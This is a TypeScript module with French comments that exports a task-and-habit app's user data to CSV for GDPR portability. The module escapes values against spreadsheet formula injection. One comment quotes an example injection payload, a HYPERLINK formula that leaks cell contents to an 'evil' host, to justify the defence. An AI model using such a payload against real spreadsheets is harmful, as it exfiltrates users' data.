/**
 * CSV export — utilitaires client-side pour exporter tâches, habitudes,
 * événements et OKR au format CSV (RFC 4180-ish).
 *
 * Pas de dépendance — String concat + Blob download. Compatible Excel + Google
 * Sheets (le séparateur est la virgule, l'encoding est UTF-8 avec BOM pour
 * forcer Excel à reconnaître les caractères accentués).
 */

import type { Task } from '@/modules/tasks';
import type { Habit } from '@/modules/habits';
import type { CalendarEvent } from '@/modules/events';
import type { OKR } from '@/modules/okrs';
import type { Category } from '@/modules/categories';
import type { TaskList } from '@/modules/lists';
import { translator } from '@/i18n/useT';

/**
 * Échappe une valeur pour CSV : entoure de guillemets si contient virgule,
 * guillemet, ou retour à la ligne. Les guillemets internes sont doublés.
 *
 * Protège aussi contre la **CSV formula injection** (faille N11) : Excel /
 * Google Sheets interprètent comme formule toute cellule dont le 1er caractère
 * est `= + - @ \t \r`. Un nom de tâche `=HYPERLINK("http://evil/?leak="&A1)`
 * exfiltrerait des données à l'ouverture du fichier. Le mitigateur standard
 * (OWASP) est de préfixer une apostrophe (`'`) — invisible à l'affichage,
 * neutralise l'interprétation formule.
 */
export function escapeCSV(value: unknown): string {
  if (value === null || value === undefined) return '';
  let str = String(value);
  if (str.length > 0 && /^[=+\-@\t\r]/.test(str)) {
    str = `'${str}`;
  }
  if (/[",\n\r]/.test(str)) {
    return `"${str.replace(/"/g, '""')}"`;
  }
  return str;
}

export function rowsToCSV(headers: string[], rows: unknown[][]): string {
  const head = headers.map(escapeCSV).join(',');
  const body = rows.map(r => r.map(escapeCSV).join(',')).join('\n');
  // BOM UTF-8 pour Excel (sinon les accents s'affichent en gibberish)
  //  = zero-width no-break space = UTF-8 BOM
  return `\uFEFF${head}\n${body}`;
}

function download(filename: string, content: string) {
  const blob = new Blob([content], { type: 'text/csv;charset=utf-8' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

function todayStr(): string {
  return new Date().toISOString().split('T')[0];
}

/**
 * Export CSV générique (headers + rows déjà construits) — même échappement
 * anti formula-injection (N11) que les exports par module. Le nom de fichier
 * est suffixé de la date du jour.
 */
export function downloadCSV(baseName: string, headers: string[], rows: unknown[][]): void {
  download(`${baseName}-${todayStr()}.csv`, rowsToCSV(headers, rows));
}


// ═══════════════════════════════════════════════════════════════════
// Libellés — catalogue `common.csv`, jamais des littéraux
// ═══════════════════════════════════════════════════════════════════
//
// 🔴 Les en-têtes, les noms de fichiers et les « Oui / Non » étaient EN DUR EN
// FRANÇAIS (revue du 2026-09-02, point 24). Or l'export CSV est le support du
// droit à la PORTABILITÉ (RGPD art. 20) : un anglophone qui exerce ce droit
// recevait sept fichiers dont il ne lit aucune colonne.
//
// `translator` est appelé DANS chaque fonction, jamais au niveau du module :
// évalué à l'import, il figerait la langue pour toute la session.

/** Un en-tête de colonne. */
const col = (key: string): string => {
  const t = translator('common').t;
  return t(`csv.col.${key}` as Parameters<typeof t>[0]);
};

/** Les en-têtes d'un tableau, dans l'ordre. */
const cols = (...keys: string[]): string[] => keys.map(col);

/** « Oui » / « Non » (majuscule) — la forme des colonnes booléennes. */
const bool = (value: boolean): string => {
  const t = translator('common').t;
  return t(value ? 'csv.yes' : 'csv.no');
};

/** « oui » / « non » (minuscule) — la forme des lignes clé/valeur du profil. */
const boolLower = (value: boolean): string => {
  const t = translator('common').t;
  return t(value ? 'csv.yesLower' : 'csv.noLower');
};

/** Nom de fichier localisé, suffixé de la date du jour. */
const fileName = (key: string): string => {
  const t = translator('common').t;
  return `${t(`csv.file.${key}` as Parameters<typeof t>[0])}-${todayStr()}.csv`;
};
// ═══════════════════════════════════════════════════════════════════
// Exports par module
// ═══════════════════════════════════════════════════════════════════

/**
 * Tâches.
 *
 * ⚠️ Cinq colonnes ont été AJOUTÉES le 2026-09-02 (risque R-09) : `description`,
 * `sous-tâches`, `récurrence`, `KR lié` et `complétée le`. Les quatre premières
 * sont saisies par la personne, donc portables au sens de l'article 20 ; la
 * dernière est la seule trace de QUAND le travail a été fait. Le fichier posait
 * déjà la règle (« Toute nouvelle donnée SAISIE doit rejoindre cette
 * fonction ») ; l'export ne la respectait pas pour les champs ajoutés depuis.
 *
 * Les sous-tâches sont aplaties en une cellule lisible plutôt qu'en JSON : un
 * export de portabilité doit s'ouvrir dans un tableur, pas se parser.
 */
export function exportTasksCSV(tasks: Task[]): void {
  const headers = cols(
    'id', 'name', 'description', 'category', 'priority', 'deadline',
    'durationMin', 'recurrence', 'subtasks', 'linkedKr',
    'completed', 'completedAt', 'bookmarked', 'createdAt',
  );
  const rows = tasks.map(t => [
    t.id,
    t.name,
    t.description || '',
    t.category,
    t.priority,
    t.deadline,
    t.estimatedTime,
    t.recurrence ?? 'none',
    (t.subtasks ?? []).map(st => `${st.completed ? '[x]' : '[ ]'} ${st.name}`).join(' | '),
    t.krId || '',
    bool(t.completed),
    t.completedAt || '',
    bool(t.bookmarked),
    t.createdAt,
  ]);
  download(fileName('tasks'), rowsToCSV(headers, rows));
}

export function exportHabitsCSV(habits: Habit[]): void {
  const headers = cols('id', 'name', 'description', 'frequency', 'durationMin', 'color', 'completions', 'createdAt');
  const rows = habits.map(h => {
    // ⚠️ `completionsTotal` d'abord : depuis la mig. 119, `h.completions` est
    // borné à une fenêtre glissante en mode Supabase. Compter dessus donnerait
    // un export TRONQUÉ — inacceptable pour un export, qui est le support du
    // droit à la portabilité (RGPD art. 20). Le repli couvre la démo et le
    // repository local, où `completions` contient tout.
    //
    // ⚠️ Le repli applique les MÊMES exclusions que le SQL (clé au format
    // `YYYY-MM-DD`, jour non futur) : sans ça, le même jeu de données donnait
    // deux totaux différents entre la démo et la production, dans un export
    // censé faire foi.
    const today = new Date().toLocaleDateString('en-CA');
    const localCount = Object.entries(h.completions).filter(
      ([day, done]) => done && /^\d{4}-\d{2}-\d{2}$/.test(day) && day <= today,
    ).length;
    const completionsCount = h.completionsTotal ?? localCount;
    return [
      h.id,
      h.name,
      h.description || '',
      h.frequency,
      h.estimatedTime,
      h.color,
      completionsCount,
      h.createdAt || '',
    ];
  });
  download(fileName('habits'), rowsToCSV(headers, rows));
}

/**
 * Événements.
 *
 * ⚠️ « Récurrent : Oui » ne suffisait pas à reconstituer l'agenda (R-09) : la
 * règle de répétition, les jours cochés et les occurrences supprimées sont
 * autant de choix de la personne. On exporte la règle elle-même, ses jours et
 * ses exceptions, plus la tâche liée quand le créneau en planifie une.
 */
export function exportEventsCSV(events: CalendarEvent[]): void {
  const headers = cols(
    'id', 'title', 'start', 'end', 'color', 'description', 'notes',
    'recurrence', 'recurrenceDays', 'removedOccurrences',
    'linkedTask', 'private',
  );
  const rows = events.map(e => [
    e.id,
    e.title,
    e.start,
    e.end,
    e.color || '',
    e.description || '',
    e.notes || '',
    e.recurrence ?? 'none',
    (e.recurrenceDays ?? []).join(' '),
    (e.exceptions ?? []).join(' '),
    e.taskId || '',
    bool(!!e.isPrivate),
  ]);
  download(fileName('events'), rowsToCSV(headers, rows));
}

export function exportOKRsCSV(okrs: OKR[]): void {
  // Une ligne par KR (avec OKR parent dénormalisé), plus exploitable en tableur
  const headers = cols(
    'okrId',
    'okrTitle',
    'okrDescription',
    'okrCategory',
    'okrProgress',
    'okrStart',
    'okrEnd',
    'krTitle',
    'krCurrent',
    'krTarget',
    'krUnit',
    'krCompleted',
  );
  const rows: unknown[][] = [];
  okrs.forEach(okr => {
    if (okr.keyResults.length === 0) {
      rows.push([okr.id, okr.title, okr.description, okr.category, okr.progress, okr.startDate, okr.endDate, '', '', '', '', '']);
    } else {
      okr.keyResults.forEach(kr => {
        rows.push([
          okr.id,
          okr.title,
          okr.description,
          okr.category,
          okr.progress,
          okr.startDate,
          okr.endDate,
          kr.title,
          kr.currentValue,
          kr.targetValue,
          kr.unit,
          bool(kr.completed),
        ]);
      });
    }
  });
  download(fileName('okrs'), rowsToCSV(headers, rows));
}

/**
 * Profil — identité et préférences fournies par la personne.
 *
 * Absent de l'export jusqu'au 2026-08-26, alors que c'est la donnée la plus
 * évidemment « fournie par la personne concernée » au sens de l'article 20 :
 * son nom et son adresse. Un export qui livre les tâches mais pas l'identité
 * de leur auteur est incomplet.
 *
 * ❌ Ne jamais exporter l'URL de l'avatar : c'est une URL de stockage signée
 *    ou publique, pas une donnée que la personne a fournie. On indique sa
 *    PRÉSENCE, ce qui suffit à savoir qu'il faut la réclamer.
 */
export function exportProfileCSV(profile: {
  id: string;
  name: string;
  email: string;
  avatar?: string;
  autoValidation?: boolean;
}): void {
  const headers = cols('field', 'value');
  const rows: unknown[][] = [
    [col('identifier'), profile.id],
    [col('name'), profile.name],
    [col('email'), profile.email],
    [col('avatar'), boolLower(!!profile.avatar)],
    [col('autoValidation'), boolLower(!!profile.autoValidation)],
  ];
  download(fileName('profile'), rowsToCSV(headers, rows));
}

/** Catégories — créées par la personne, donc portables. */
export function exportCategoriesCSV(categories: Category[]): void {
  const headers = cols('id', 'name', 'color');
  const rows = categories.map((c) => [c.id, c.name, c.color]);
  download(fileName('categories'), rowsToCSV(headers, rows));
}

/**
 * Listes — y compris les listes intelligentes.
 *
 * `taskIds` est exporté en COMPTE et non en liste d'identifiants : le
 * rattachement d'une tâche à une liste est déjà porté par l'export des tâches,
 * et recopier des centaines d'identifiants dans une cellule rendrait le
 * fichier illisible sans rien ajouter.
 */
export function exportListsCSV(lists: TaskList[]): void {
  const headers = cols('id', 'name', 'color', 'type', 'smartRule', 'taskCount');
  const rows = lists.map((l) => [
    l.id,
    l.name,
    l.color,
    l.type ?? 'manual',
    l.smartRule ?? '',
    l.taskIds?.length ?? 0,
  ]);
  download(fileName('lists'), rowsToCSV(headers, rows));
}

/**
 * Export combiné — déclenche les téléchargements en séquence (Safari refuse
 * souvent plusieurs `.click()` simultanés, on les espace de 150 ms).
 *
 * ⚠️ Sept fichiers depuis le 2026-08-26, contre quatre avant : profil,
 * catégories et listes manquaient. Toute nouvelle donnée SAISIE par
 * l'utilisateur doit rejoindre cette fonction, sinon l'export cesse
 * silencieusement d'être complet et la portabilité devient un mensonge.
 */
/**
 * ⚠️ PLAFOND. `getAll()` passe par `fetchAllPages`, borné à `MAX_ROWS = 5000`.
 * Au-delà, l'export est TRONQUÉ et seul un toast le signale (cf.
 * `pagination.warning.ts`). Pour un export de portabilité, une troncature
 * silencieuse est un défaut de conformité, pas un détail de performance :
 * si un compte s'approche du plafond, il faut lever la borne ou exporter par
 * lots avant de livrer le fichier.
 */
export function exportAllCSV(data: {
  tasks: Task[];
  habits: Habit[];
  events: CalendarEvent[];
  okrs: OKR[];
  categories: Category[];
  lists: TaskList[];
  profile: { id: string; name: string; email: string; avatar?: string; autoValidation?: boolean };
}): void {
  exportTasksCSV(data.tasks);
  setTimeout(() => exportHabitsCSV(data.habits), 150);
  setTimeout(() => exportEventsCSV(data.events), 300);
  setTimeout(() => exportOKRsCSV(data.okrs), 450);
  setTimeout(() => exportCategoriesCSV(data.categories), 600);
  setTimeout(() => exportListsCSV(data.lists), 750);
  setTimeout(() => exportProfileCSV(data.profile), 900);
}
